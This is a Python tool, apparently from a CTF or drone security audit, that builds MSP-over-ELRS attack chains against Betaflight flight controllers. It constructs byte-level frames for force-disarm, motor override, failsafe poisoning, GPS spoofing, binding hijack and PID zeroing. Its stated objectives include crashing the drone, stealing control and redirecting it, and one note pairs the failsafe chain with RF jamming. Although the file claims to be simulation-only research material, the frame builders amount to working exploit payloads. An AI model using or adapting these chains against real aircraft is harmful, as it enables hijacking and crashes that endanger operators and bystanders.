#!/usr/bin/env python3
"""
MSP-over-ELRS Multi-Step Attack Chain Orchestrator.

Sequences compound MSP attack chains with timing simulation for the
ELRS 150 Hz packet rate. Each chain combines multiple MSP commands
to achieve a higher-level objective identified in the Betaflight 4.4.2
vulnerability audit (PR #34).

Chains:
  1. drop        — Force-disarm + motor override → drone falls
  2. hijack      — RX config rewrite + EEPROM write → steal binding
  3. failsafe-ambush — Rewrite failsafe to DROP + delay=0 → jam link → crash
  4. gps-redirect — Poison GPS + rewrite failsafe to GPS_RESCUE → redirect
  5. destabilize — Zero PID gains + flip board alignment → erratic flight
  6. full-kill   — disarm + failsafe-poison + motor-zero + reboot (maximum damage)

All operations are offline/simulated. No RF is transmitted, no hardware
is accessed, no live target is contacted.

Requires: Python 3.10+

Usage:
    # List available chains
    python3 msp-elrs-attack-chains.py --list

    # Simulate the drop chain with timing
    python3 msp-elrs-attack-chains.py --chain drop

    # All chains with verbose output
    python3 msp-elrs-attack-chains.py --chain all --verbose

    # Show ELRS OTA packet details
    python3 msp-elrs-attack-chains.py --chain drop --show-ota --phrase "iloveflying"

For CTF research and authorized security testing only.
"""

from __future__ import annotations

import argparse
import hashlib
import os
import struct
import sys
from dataclasses import dataclass, field

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)

from elrs_core.v3_compat import v3_uid_crc_init, v3_generate_crc


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PACKET_RATE_HZ = 150
SLOT_MS = 1000.0 / PACKET_RATE_HZ
HOP_INTERVAL = 4
FREQ_COUNT = 80

# MSP commands
MSP_REBOOT = 68
MSP_SET_FAILSAFE_CONFIG = 76
MSP_SET_RX_CONFIG = 45
MSP_SET_RAW_RC = 200
MSP_SET_RAW_GPS = 201
MSP_SET_MOTOR = 214
MSP_EEPROM_WRITE = 250
MSP_SET_ARMING_DISABLED = 251
MSP_SET_PID = 0x92
MSP_SET_BOARD_ALIGNMENT = 0x26
MSP_SET_FEATURE_CONFIG = 0xCA


# ---------------------------------------------------------------------------
# MSP/CRSF/ELRS framing (shared with other PoCs)
# ---------------------------------------------------------------------------
def msp_checksum(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
    return crc


def build_msp_command(cmd: int, payload: bytes = b"") -> bytes:
    body = bytes([len(payload), cmd]) + payload
    return b"$M<" + body + bytes([msp_checksum(body)])


def crsf_crc8(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = ((crc << 1) ^ 0xD5) & 0xFF if crc & 0x80 else (crc << 1) & 0xFF
    return crc


def build_crsf_msp_frame(cmd: int, payload: bytes = b"") -> bytes:
    msp_inner = bytes([0x00, 0x00, cmd, len(payload)]) + payload
    frame_type = 0x7C if payload else 0x7A
    frame_body = bytes([frame_type, 0xC8, 0xEA]) + msp_inner
    crc = crsf_crc8(frame_body)
    return bytes([0xC8, len(frame_body) + 1, *frame_body, crc])


ELRS_DATA_BYTES = 5


def elrs_packet_count(cmd: int, payload: bytes) -> int:
    crsf = build_crsf_msp_frame(cmd, payload)
    usable = ELRS_DATA_BYTES - 1
    return (len(crsf) + usable - 1) // usable


def split_crsf_to_elrs(crsf: bytes) -> list[bytes]:
    chunks: list[bytes] = []
    offset = 0
    seq = 0
    while offset < len(crsf):
        remaining = len(crsf) - offset
        is_last = remaining <= (ELRS_DATA_BYTES - 1)
        header = seq & 0x0F
        if not is_last:
            header |= 0x80
        chunk = bytes([header]) + crsf[offset:offset + ELRS_DATA_BYTES - 1]
        if len(chunk) < ELRS_DATA_BYTES:
            chunk += b"\x00" * (ELRS_DATA_BYTES - len(chunk))
        chunks.append(chunk)
        offset += ELRS_DATA_BYTES - 1
        seq += 1
    return chunks


# ---------------------------------------------------------------------------
# Attack step definitions
# ---------------------------------------------------------------------------
@dataclass
class AttackStep:
    name: str
    description: str
    msp_cmd: int
    msp_payload: bytes
    requires_disarmed: bool = False
    delay_after_ms: float = 0.0

    @property
    def elrs_packets(self) -> int:
        return elrs_packet_count(self.msp_cmd, self.msp_payload)

    @property
    def inject_time_ms(self) -> float:
        return self.elrs_packets * SLOT_MS


def step_force_disarm() -> AttackStep:
    return AttackStep(
        name="force-disarm",
        description="MSP_SET_ARMING_DISABLED: immediate motor shutdown",
        msp_cmd=MSP_SET_ARMING_DISABLED,
        msp_payload=bytes([1, 0, 0, 0]),
    )


def step_reboot(mode: int = 0) -> AttackStep:
    modes = {0: "firmware", 1: "bootloader", 2: "MSC"}
    return AttackStep(
        name=f"reboot-{modes.get(mode, 'unknown')}",
        description=f"MSP_REBOOT mode={mode}: {modes.get(mode, '?')} reboot",
        msp_cmd=MSP_REBOOT,
        msp_payload=bytes([mode]),
    )


def step_motor_override(values: list[int] | None = None) -> AttackStep:
    if values is None:
        values = [1000] * 4 + [0] * 4
    payload = b"".join(struct.pack("<H", v) for v in values)
    return AttackStep(
        name="motor-override",
        description=f"MSP_SET_MOTOR: set motors to {values[:4]}",
        msp_cmd=MSP_SET_MOTOR,
        msp_payload=payload,
    )


def step_failsafe_poison(delay: int = 0, procedure: int = 0,
                          throttle: int = 1000) -> AttackStep:
    payload = (bytes([delay, 0]) + struct.pack("<H", throttle) +
               bytes([0]) + struct.pack("<H", 0) + bytes([procedure]))
    procs = {0: "DROP", 1: "LAND", 2: "GPS_RESCUE"}
    return AttackStep(
        name="failsafe-poison",
        description=(f"MSP_SET_FAILSAFE_CONFIG: delay={delay}, "
                     f"procedure={procs.get(procedure, '?')}, throttle={throttle}"),
        msp_cmd=MSP_SET_FAILSAFE_CONFIG,
        msp_payload=payload,
    )


def step_gps_poison(lat: float = 38.95, lon: float = -77.05,
                     alt: int = 100) -> AttackStep:
    payload = (bytes([1, 12]) +
               struct.pack("<i", int(lat * 1e7)) +
               struct.pack("<i", int(lon * 1e7)) +
               struct.pack("<HH", alt, 0))
    return AttackStep(
        name="gps-poison",
        description=f"MSP_SET_RAW_GPS: inject lat={lat}, lon={lon}, alt={alt}m",
        msp_cmd=MSP_SET_RAW_GPS,
        msp_payload=payload,
    )


def step_rx_config_rewrite(attacker_uid: bytes = b"\xde\xad\xbe\xef\xca\xfe") -> AttackStep:
    payload = (bytes([0]) + struct.pack("<HHH", 1500, 1500, 885) +
               bytes([0]) + struct.pack("<HH", 1100, 1900) +
               bytes(5) + attacker_uid + bytes(2))
    return AttackStep(
        name="rx-uid-rewrite",
        description="MSP_SET_RX_CONFIG: overwrite binding UID to attacker's",
        msp_cmd=MSP_SET_RX_CONFIG,
        msp_payload=payload,
    )


def step_eeprom_write() -> AttackStep:
    return AttackStep(
        name="eeprom-write",
        description="MSP_EEPROM_WRITE: persist config changes (requires disarmed)",
        msp_cmd=MSP_EEPROM_WRITE,
        msp_payload=b"",
        requires_disarmed=True,
    )


def step_zero_pids() -> AttackStep:
    return AttackStep(
        name="zero-pids",
        description="MSP_SET_PID: zero all PID gains (loss of stabilization)",
        msp_cmd=MSP_SET_PID,
        msp_payload=bytes(30),
    )


def step_flip_alignment() -> AttackStep:
    return AttackStep(
        name="flip-alignment",
        description="MSP_SET_BOARD_ALIGNMENT: roll=1800 (invert orientation)",
        msp_cmd=MSP_SET_BOARD_ALIGNMENT,
        msp_payload=struct.pack("<hhh", 1800, 0, 0),
    )


def step_rc_override(channels: list[int] | None = None) -> AttackStep:
    if channels is None:
        channels = [1500, 1500, 1000, 1500, 1000, 1000, 1000, 1000]
    payload = b"".join(struct.pack("<H", ch) for ch in channels)
    return AttackStep(
        name="rc-override",
        description="MSP_SET_RAW_RC: inject RC channels (throttle zeroed)",
        msp_cmd=MSP_SET_RAW_RC,
        msp_payload=payload,
    )


# ---------------------------------------------------------------------------
# Attack chains
# ---------------------------------------------------------------------------
@dataclass
class AttackChain:
    name: str
    description: str
    objective: str
    steps: list[AttackStep]
    notes: str = ""

    @property
    def total_packets(self) -> int:
        return sum(s.elrs_packets for s in self.steps)

    @property
    def total_inject_ms(self) -> float:
        return sum(s.inject_time_ms + s.delay_after_ms for s in self.steps)


def build_chains() -> dict[str, AttackChain]:
    chains: dict[str, AttackChain] = {}

    chains["drop"] = AttackChain(
        name="drop",
        description="Force-disarm + motor override → drone falls immediately",
        objective="Crash the target drone from any flight state",
        steps=[
            step_force_disarm(),
            step_motor_override([1000, 1000, 1000, 1000, 0, 0, 0, 0]),
        ],
        notes="Simplest kill chain. Force-disarm alone is sufficient for "
              "motor shutdown; motor override prevents re-arm recovery.",
    )

    chains["hijack"] = AttackChain(
        name="hijack",
        description="Rewrite RX binding UID → lock out legitimate transmitter",
        objective="Steal control of the drone by replacing its pairing",
        steps=[
            step_force_disarm(),
            step_rx_config_rewrite(),
            step_eeprom_write(),
            step_reboot(),
        ],
        notes="After reboot, the drone binds to the attacker's UID. "
              "EEPROM write requires disarmed state (hence force-disarm first). "
              "The attacker needs their own ELRS TX with the new UID to fly it.",
    )

    chains["failsafe-ambush"] = AttackChain(
        name="failsafe-ambush",
        description="Poison failsafe config then jam the link → instant crash",
        objective="Prepare the drone to crash on signal loss",
        steps=[
            step_failsafe_poison(delay=0, procedure=0, throttle=1000),
            step_rc_override([1500, 1500, 1500, 1500, 1000, 1000, 1000, 1000]),
        ],
        notes="After failsafe is set to DROP with zero delay, any signal "
              "interruption (even brief jamming) causes immediate motor cutoff. "
              "The RC override keeps the drone flying while the attacker "
              "prepares the jam. On CTF day, follow with RF jamming.",
    )

    chains["gps-redirect"] = AttackChain(
        name="gps-redirect",
        description="Poison GPS + set failsafe to GPS_RESCUE → redirect drone",
        objective="Make the drone fly to attacker-chosen coordinates on signal loss",
        steps=[
            step_failsafe_poison(delay=2, procedure=2, throttle=1300),
            step_gps_poison(lat=38.95, lon=-77.05, alt=50),
        ],
        notes="Sets failsafe_procedure=GPS_RESCUE with poisoned coordinates. "
              "When the legitimate link drops (or is jammed), the drone "
              "attempts to return to the attacker's position. Requires "
              "GPS hardware on the FC (TinyHawk III has no GPS by default).",
    )

    chains["destabilize"] = AttackChain(
        name="destabilize",
        description="Zero PID gains + flip board alignment → erratic flight",
        objective="Make the drone uncontrollable without immediately crashing",
        steps=[
            step_zero_pids(),
            step_flip_alignment(),
        ],
        notes="Zeroing PID gains removes stabilization; flipping board "
              "alignment inverts the gyro reference so corrections go "
              "the wrong way. Combined effect is uncontrollable oscillation. "
              "More subtle than force-disarm: the operator may not realize "
              "the drone is compromised until it's too late.",
    )

    chains["full-kill"] = AttackChain(
        name="full-kill",
        description="Maximum damage: disarm + failsafe-poison + motor-zero + reboot",
        objective="Ensure the drone cannot recover from any state",
        steps=[
            step_force_disarm(),
            step_failsafe_poison(delay=0, procedure=0, throttle=1000),
            step_motor_override([1000] * 4 + [0] * 4),
            step_reboot(),
        ],
        notes="Belt-and-suspenders approach: force-disarm stops motors, "
              "failsafe-poison prevents recovery, motor override zeros "
              "values, and reboot ensures the FC restarts in a degraded "
              "state. Each step independently degrades the target.",
    )

    return chains


# ---------------------------------------------------------------------------
# Simulation and output
# ---------------------------------------------------------------------------
@dataclass
class ChainSimResult:
    chain: AttackChain
    step_details: list[dict] = field(default_factory=list)
    total_packets: int = 0
    total_time_ms: float = 0.0
    connection_overhead_ms: float = 0.0


def simulate_chain(chain: AttackChain, uid: bytes | None = None,
                   show_ota: bool = False) -> ChainSimResult:
    # Connection overhead: two SYNC intervals
    conn_ms = FREQ_COUNT * HOP_INTERVAL * SLOT_MS
    result = ChainSimResult(
        chain=chain,
        connection_overhead_ms=round(conn_ms, 1),
    )

    sim_time = conn_ms
    total_pkts = 0

    for step in chain.steps:
        msp_frame = build_msp_command(step.msp_cmd, step.msp_payload)
        crsf_frame = build_crsf_msp_frame(step.msp_cmd, step.msp_payload)
        elrs_chunks = split_crsf_to_elrs(crsf_frame)
        n_pkts = len(elrs_chunks)
        inject_ms = n_pkts * SLOT_MS

        detail: dict = {
            "name": step.name,
            "description": step.description,
            "msp_cmd": step.msp_cmd,
            "payload_len": len(step.msp_payload),
            "msp_frame_hex": msp_frame.hex(),
            "crsf_frame_len": len(crsf_frame),
            "elrs_packets": n_pkts,
            "inject_time_ms": round(inject_ms, 1),
            "start_time_ms": round(sim_time, 1),
            "requires_disarmed": step.requires_disarmed,
        }

        if show_ota and uid is not None:
            ota_frames = []
            for chunk in elrs_chunks:
                frame = bytearray(8)
                frame[0] = 0x01  # DATA type
                frame[1:6] = chunk[:5]
                frame[6] = 0x00
                frame[7] = 0x00
                v3_generate_crc(frame, uid)
                ota_frames.append(frame.hex())
            detail["ota_frames"] = ota_frames

        result.step_details.append(detail)
        sim_time += inject_ms + step.delay_after_ms
        total_pkts += n_pkts

    result.total_packets = total_pkts
    result.total_time_ms = round(sim_time, 1)
    return result


def print_chain_result(result: ChainSimResult, verbose: bool = False) -> None:
    chain = result.chain
    print(f"\n{'='*65}")
    print(f"Attack Chain: {chain.name}")
    print(f"{'='*65}")
    print(f"  Objective:  {chain.objective}")
    print(f"  Steps:      {len(chain.steps)}")
    print(f"  Packets:    {result.total_packets}")
    print(f"  Conn setup: {result.connection_overhead_ms} ms")
    print(f"  Total time: {result.total_time_ms} ms")

    print(f"\n--- Execution Timeline ---\n")
    print(f"  {'#':<3s} {'Time':>8s} {'Step':<22s} {'Pkts':>5s} "
          f"{'Inject':>8s} {'Cmd':>5s}")
    print(f"  {'-'*3} {'-'*8} {'-'*22} {'-'*5} {'-'*8} {'-'*5}")

    for i, detail in enumerate(result.step_details):
        armed_note = " [needs disarmed]" if detail["requires_disarmed"] else ""
        print(f"  {i+1:<3d} {detail['start_time_ms']:>6.1f}ms "
              f"{detail['name']:<22s} {detail['elrs_packets']:>5d} "
              f"{detail['inject_time_ms']:>6.1f}ms "
              f"{detail['msp_cmd']:>5d}{armed_note}")

    if verbose:
        print(f"\n--- Step Details ---")
        for i, detail in enumerate(result.step_details):
            print(f"\n  Step {i+1}: {detail['name']}")
            print(f"    {detail['description']}")
            print(f"    MSP frame:  {detail['msp_frame_hex']}")
            print(f"    CRSF len:   {detail['crsf_frame_len']} bytes")
            if "ota_frames" in detail:
                for j, frame in enumerate(detail["ota_frames"]):
                    print(f"    OTA [{j}]:    {frame}")

    if chain.notes:
        print(f"\n  Notes: {chain.notes}")

    print(f"\n{'='*65}")
    print("SIMULATION ONLY — no RF transmitted, no hardware accessed")
    print(f"{'='*65}")


def print_chain_comparison(chains: dict[str, AttackChain]) -> None:
    print(f"\n{'='*70}")
    print("Attack Chain Comparison (150 Hz ELRS v3)")
    print(f"{'='*70}\n")

    conn_ms = FREQ_COUNT * HOP_INTERVAL * SLOT_MS

    print(f"  {'Chain':<20s} {'Steps':>5s} {'Pkts':>5s} "
          f"{'Inject':>8s} {'Total':>8s} {'Objective'}")
    print(f"  {'-'*20} {'-'*5} {'-'*5} {'-'*8} {'-'*8} {'-'*30}")

    for name, chain in chains.items():
        pkts = chain.total_packets
        inject_ms = chain.total_inject_ms
        total_ms = conn_ms + inject_ms
        obj = chain.objective[:30]
        print(f"  {name:<20s} {len(chain.steps):>5d} {pkts:>5d} "
              f"{inject_ms:>6.1f}ms {total_ms:>6.1f}ms {obj}")

    print(f"\n  Connection overhead: {conn_ms:.1f} ms (one SYNC interval)")
    print(f"  Packet rate: {PACKET_RATE_HZ} Hz ({SLOT_MS:.3f} ms/slot)")
    print(f"\n{'='*70}\n")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    chains = build_chains()

    parser = argparse.ArgumentParser(
        description="MSP-over-ELRS multi-step attack chain orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )
    parser.add_argument("--chain", default="all",
                        choices=list(chains.keys()) + ["all", "compare"],
                        help="Chain to simulate (default: all)")
    parser.add_argument("--list", action="store_true",
                        help="List available chains and exit")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Show full packet details")
    parser.add_argument("--show-ota", action="store_true",
                        help="Show ELRS OTA frames (requires --phrase)")
    parser.add_argument("--phrase", default="iloveflying",
                        help="Binding phrase for OTA frame generation")

    args = parser.parse_args()

    if args.list:
        print("\nAvailable attack chains:\n")
        for name, chain in chains.items():
            print(f"  {name:<20s} {chain.description}")
            print(f"  {'':20s} Steps: {len(chain.steps)}, "
                  f"Packets: {chain.total_packets}, "
                  f"Inject: {chain.total_inject_ms:.1f} ms")
            print()
        return

    uid = hashlib.md5(args.phrase.encode()).digest()[:6] if args.show_ota else None

    if args.chain == "compare":
        print_chain_comparison(chains)
        return

    if args.chain == "all":
        print_chain_comparison(chains)
        for name, chain in chains.items():
            result = simulate_chain(chain, uid, args.show_ota)
            print_chain_result(result, args.verbose)
    else:
        chain = chains[args.chain]
        result = simulate_chain(chain, uid, args.show_ota)
        print_chain_result(result, args.verbose)


if __name__ == "__main__":
    main()
